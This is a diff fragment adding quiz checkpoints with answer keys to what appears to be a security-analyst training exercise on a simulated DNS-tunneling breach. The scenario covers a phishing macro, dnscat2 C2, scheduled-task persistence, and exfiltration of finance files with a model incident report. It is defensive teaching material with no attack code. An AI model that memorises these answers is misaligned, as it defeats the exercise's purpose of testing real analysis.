+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "Approximately how much data was exfiltrated via the DNS tunnel, and what types of files were stolen?",
+      "options": [
+        "2.5 MB — system configuration files and registry exports",
+        "8.15 MB — confidential financial documents (revenue forecast, salary data, board presentation)",
+        "50 MB — entire user profile directory contents",
+        "500 KB — only the file listing enumeration results"
+      ],
+      "correctAnswer": "8.15 MB — confidential financial documents (revenue forecast, salary data, board presentation)",
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "The EDR alert (EDR-2025-09182578) shows three files accessed by svchost-update.exe: Q3_Revenue_Forecast_2025.xlsx (2.46 MB), Employee_Salary_Data_Sept2025.csv (0.85 MB), and Board_Presentation_Q3.pptx (5.24 MB), totaling 8.15 MB. The SIEM correlation alert (SIEM-CORR-2025-4489) confirms this estimate and identifies all three files by name. These are confidential financial documents from the Finance department.",
+      "sortOrder": 10
+    },
+    {
+      "stageNumber": 4,
+      "checkpointType": "SEVERITY_CLASSIFICATION",
+      "question": "What is the appropriate severity classification for this incident?",
+      "options": [
+        "LOW — No sensitive data was affected",
+        "MEDIUM — Suspicious activity detected but no confirmed compromise",
+        "HIGH — Confirmed compromise with potential data exposure",
+        "CRITICAL — Confirmed data breach with active exfiltration of confidential financial data"
+      ],
+      "correctAnswer": "CRITICAL — Confirmed data breach with active exfiltration of confidential financial data",
+      "points": 10,
+      "category": "response",
+      "explanation": "This incident is CRITICAL severity. There is a confirmed compromise (malicious macro → C2 implant), a confirmed covert C2 channel (DNS tunneling via dnscat2), established persistence (scheduled task), and active exfiltration of classified-confidential financial data (revenue forecasts, employee salary data, board presentations). The attacker has ongoing access and is actively stealing data. This requires immediate incident response: host isolation, domain blocking, credential revocation, and executive notification due to the financial data sensitivity.",
+      "sortOrder": 11
+    },
+    {
+      "stageNumber": 4,
+      "checkpointType": "INCIDENT_REPORT",
+      "question": "Write a concise incident summary for this DNS tunneling attack. Include: (1) the attack vector, (2) the C2 mechanism and tool used, (3) what data was exfiltrated, (4) the MITRE ATT&CK techniques observed, and (5) your recommended immediate containment actions.",
+      "options": [],
+      "correctAnswer": "This incident involves a spearphishing attack (T1566.001) targeting Finance user a.kumar via a macro-enabled Excel attachment. The macro executed PowerShell (T1059.001) which, after being blocked by the firewall from direct HTTP C2, established a covert DNS tunneling channel using dnscat2 (T1071.004). The attacker used Base64-encoded TXT record queries to communicate with their C2 server at data.ns1.updateservice-cdn.com (registered 48 hours prior). Through this channel, the attacker performed host reconnaissance (T1033, T1082, T1087), established persistence via a hidden scheduled task named WindowsUpdateCheck (T1053.005), and exfiltrated approximately 8.15 MB of confidential financial data including Q3 revenue forecasts, employee salary data, and board presentation materials (T1041). Immediate containment actions: (1) Isolate WS-PC15 from the network, (2) Block updateservice-cdn.com at DNS sinkhole and firewall, (3) Block 198.51.100.53 at the firewall, (4) Revoke and reset a.kumar's credentials, (5) Remove the WindowsUpdateCheck scheduled task, (6) Enforce split-DNS policy to prevent direct external DNS resolution, (7) Scan other Finance department hosts for similar indicators, (8) Notify legal and executive leadership due to potential financial data breach.",
+      "points": 20,
+      "category": "report",
+      "explanation": "A complete incident report should cover the full attack chain from initial access through exfiltration, identify the specific tools and techniques used, quantify the data impact, and provide actionable containment steps. Key elements that must be included: the phishing vector, the firewall block that forced DNS pivoting, the dnscat2 tool identification, the persistence mechanism, the specific files exfiltrated with their classification level, and concrete remediation actions including network isolation, domain blocking, credential reset, and policy enforcement for DNS.",
+      "sortOrder": 12
+    }
+  ]
+}
